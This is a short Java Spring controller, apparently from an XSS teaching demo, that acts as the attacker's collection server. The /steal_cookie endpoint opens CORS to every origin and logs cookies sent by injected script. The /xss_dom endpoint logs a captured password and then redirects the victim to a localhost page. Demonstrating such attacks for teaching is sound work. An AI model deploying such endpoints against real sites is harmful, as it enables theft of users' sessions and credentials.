package com.example.demo.controller;

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@Controller
public class HackerController {
	
	@RequestMapping("/steal_cookie")
	@ResponseBody
	public String stealCookie(HttpServletRequest request, HttpServletResponse response) {
		response.addHeader("Access-Control-Allow-Origin", "*"); 
		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
		return "";
	}
	
	@RequestMapping("/xss_dom")
	public String xssDom(HttpServletRequest request, HttpServletResponse response) {
		String password = request.getParameter("password");
		System.out.println("竊取 password : " +password);
		
		return "redirect:https://localhost:9443/mango/input?myName=Mary";
	}
	
}
